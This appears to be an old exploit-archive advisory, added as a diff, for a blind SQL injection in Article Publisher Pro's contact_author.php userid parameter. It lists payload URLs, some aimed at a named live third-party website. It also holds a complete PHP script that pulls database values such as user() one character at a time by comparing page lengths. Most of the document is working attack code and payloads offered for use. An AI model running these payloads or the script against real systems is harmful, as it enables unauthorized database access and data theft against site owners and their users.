@@ -1,0 +1,87 @@
+###########################################################################
+# Kira has decide be back after halloween
+###########################################################################
+# Discovered by : Mountassif Moad
+# Type Gap : Blind Sql Injection
+# Script : Article Publisher Pro : http://www.phparticlescript.com/
+# Greetz : Allah , All my freind
+##########################################################################
+
+P0c :
+
+http://localhost/contact_author.php?userid=1+and+1=1   true
+
+http://localhost/contact_author.php?userid=1+and+1=0   false
+
+http://demo-article-publisher-pro.phparticlescript.com/contact_author.php?userid=1+and+1=1   true
+
+http://demo-article-publisher-pro.phparticlescript.com/contact_author.php?userid=1+and+1=0   false
+
+Exploit :
+
+http://localhost/contact_author.php?userid=1+and+1=1+and+substring(@@version,1,1)=4   true
+
+http://localhost/contact_author.php?userid=1+and+1=1+and+substring(@@version,1,1)=5   false
+
+Demo Test :
+
+http://fashiongumbo.com/contact_author.php?userid=1+and+1=1+and+substring(@@version,1,1)=4  true
+
+http://fashiongumbo.com/contact_author.php?userid=1+and+1=1+and+substring(@@version,1,1)=5  false
+
+code Exploit :
+
+<?php
+ini_set("max_execution_time",0);
+print_r('
+###############################################################
+#
+#      Article Publisher Pro - Blind SQL Injection Exploit    
+#
+###############################################################
+#                                                            
+#      Dork:        N/A
+#      Usage:       php '.$argv[0].' [Target] [data]
+#      Live Demo :
+#      =>php '.$argv[0].' http://localhost/contact_author.php?userid=1 user()
+#                                                            
+###############################################################
+');
+if ($argc > 1) {
+$url = $argv[1];
+$r = strlen(file_get_contents($url."+and+1=1"));
+echo "\nExploiting:\n";
+$w = strlen(file_get_contents($url."'+and+1=0"));
+$t = abs((100-($w/$r*100)));
+echo "\n".$argv[2].": ";
+for ($i=1; $i <= 30; $i++) {
+$laenge = strlen(file_get_contents($url."+and+ascii(substring((".$argv[2]."),".$i.",1))!=0"));
+   if (abs((100-($laenge/$r*100))) > $t-1) {
+      $count = $i;
+      $i = 30;
+   }
+}
+for ($j = 1; $j < $count; $j++) {
+   for ($i = 46; $i <= 122; $i=$i+2) {
+      if ($i == 60) {
+         $i = 98;
+      }
+      $laenge = strlen(file_get_contents($url."+and+ascii(substring((".$argv[2]."),".$j.",1))%3E".$i.""));
+      if (abs((100-($laenge/$r*100))) > $t-1) {
+         $laenge = strlen(file_get_contents($url."+and+ascii(substring((".$argv[2]."),".$j.",1))%3E".($i-1).""));
+         if (abs((100-($laenge/$r*100))) > $t-1) {
+            echo chr($i-1);
+         } else {
+            echo chr($i);
+         }
+         $i = 122;
+      }
+   }
+}
+
+} else {
+echo "\nExploiting failed: ar u sur your link have a real id user \n";
+}
+?>
+
+# milw0rm.com [2008-10-31]
